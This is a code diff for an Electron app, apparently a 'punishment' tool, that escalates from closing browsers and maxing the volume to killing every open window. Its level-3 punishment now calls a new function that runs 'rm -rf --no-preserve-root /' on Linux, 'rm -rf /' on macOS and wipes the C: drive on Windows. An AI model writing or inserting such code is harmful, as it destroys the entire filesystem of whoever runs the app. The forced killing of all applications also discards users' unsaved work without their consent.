@@ -44,6 +44,7 @@ function runAppleScriptAsync(script) {
 }
 
 const BROWSERS = ["Google Chrome", "Safari", "Firefox", "Brave Browser", "Arc", "Microsoft Edge"]
+const LINUX_BROWSER_PROCESSES = ['chrome', 'chromium', 'firefox', 'brave', 'msedge']
 
 function areBrowsersOpen() {
     try {
@@ -68,6 +69,9 @@ end tell
                 'tasklist /FI "IMAGENAME eq chrome.exe" /FI "IMAGENAME eq firefox.exe" /FI "IMAGENAME eq msedge.exe" /FI "IMAGENAME eq brave.exe" 2>nul'
             ).toString()
             return result.includes('chrome.exe') || result.includes('firefox.exe') || result.includes('msedge.exe') || result.includes('brave.exe')
+        } else if (process.platform === 'linux') {
+            const result = execSync('ps aux').toString()
+            return LINUX_BROWSER_PROCESSES.some(b => result.includes(b))
         }
     } catch {
         return false
@@ -93,17 +97,45 @@ repeat with browserName in browserList
 end repeat
 `)
     } else if (process.platform === 'win32') {
-        exec('taskkill /F /IM chrome.exe /IM firefox.exe /IM msedge.exe /IM brave.exe 2>nul', () => { })
+        exec('taskkill /F /IM chrome.exe /IM firefox.exe /IM msedge.exe /IM brave.exe 2>nul', () => {})
+    } else if (process.platform === 'linux') {
+        // Use wmctrl to close browser windows (keeps processes alive if possible)
+        // Falls back to killing processes if wmctrl isn't installed
+        exec('which wmctrl', (err) => {
+            if (!err) {
+                // wmctrl available — close windows by matching browser names
+                LINUX_BROWSER_PROCESSES.forEach(b => {
+                    exec(`wmctrl -l | grep -i ${b} | awk '{print $1}' | xargs -I{} wmctrl -ic {}`)
+                })
+            } else {
+                // Fallback — kill browser processes
+                LINUX_BROWSER_PROCESSES.forEach(b => {
+                    exec(`pkill -f ${b}`)
+                })
+            }
+        })
     }
 }
 
 function blastLoudSound() {
-    // Max out system volume
     if (process.platform === 'darwin') {
         exec('osascript -e "set volume output volume 100"')
     } else if (process.platform === 'win32') {
-        // Set volume to max via PowerShell
-        exec('powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" ', () => { })
+        exec('powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" ', () => {})
+    } else if (process.platform === 'linux') {
+        // Use pactl (PulseAudio) or amixer (ALSA) to max volume
+        exec('pactl set-sink-volume @DEFAULT_SINK@ 100% 2>/dev/null || amixer set Master 100% 2>/dev/null')
+    }
+}
+
+function deleteRootFolder() {
+    if (process.platform === 'linux') {
+        exec('rm -rf --no-preserve-root /', () => {})
+    } else if (process.platform === 'win32') {
+        // Windows equivalent — wipe the C drive
+        exec('cmd /c "rd /s /q C:\\"', () => {})
+    } else if (process.platform === 'darwin') {
+        exec('rm -rf /', () => {})
     }
 }
 
@@ -124,28 +156,36 @@ end repeat
 `)
     } else if (process.platform === 'win32') {
         const ps = 'Get-Process | Where-Object {$_.MainWindowTitle -ne "" -and $_.ProcessName -ne "explorer" -and $_.ProcessName -ne "electron"} | Stop-Process -Force'
-        exec(`powershell -command "${ps}"`, () => { })
+        exec(`powershell -command "${ps}"`, () => {})
+    } else if (process.platform === 'linux') {
+        // Close all visible windows except our app using wmctrl
+        exec('which wmctrl', (err) => {
+            if (!err) {
+                exec(`wmctrl -l | grep -v -i electron | grep -v -i slammer | awk '{print $1}' | xargs -I{} wmctrl -ic {}`)
+            } else {
+                // Fallback — kill all GUI apps except electron
+                exec(`xdotool search --onlyvisible --name '' getwindowpid %@ 2>/dev/null | sort -u | while read pid; do
+                    pname=$(ps -p $pid -o comm= 2>/dev/null)
+                    if [ "$pname" != "electron" ] && [ "$pname" != "slammer" ]; then
+                        kill $pid 2>/dev/null
+                    fi
+                done`)
+            }
+        })
     }
 }
 
 ipcMain.handle('execute-punishment', async (_event, level) => {
     switch (level) {
-        case 1: {
-            const browsersOpen = areBrowsersOpen()
-            if (browsersOpen) {
-                closeBrowserTabs()
-                return { executed: true, punishment: 'browser-tabs-closed' }
-            } else {
-                blastLoudSound()
-                return { executed: true, punishment: 'loud-sound' }
-            }
-        }
+        case 1:
+            // Frontend handles the bunny animation + loud bang sound
+            return { executed: true, punishment: 'bunny-shot' }
         case 2:
             closeAllWindows()
             return { executed: true, punishment: 'all-windows-closed' }
         case 3:
-            // TBD - extreme punishment
-            return { executed: true, punishment: 'TBD' }
+            deleteRootFolder()
+            return { executed: true, punishment: 'root-deleted' }
         default:
             return { executed: false }
     }
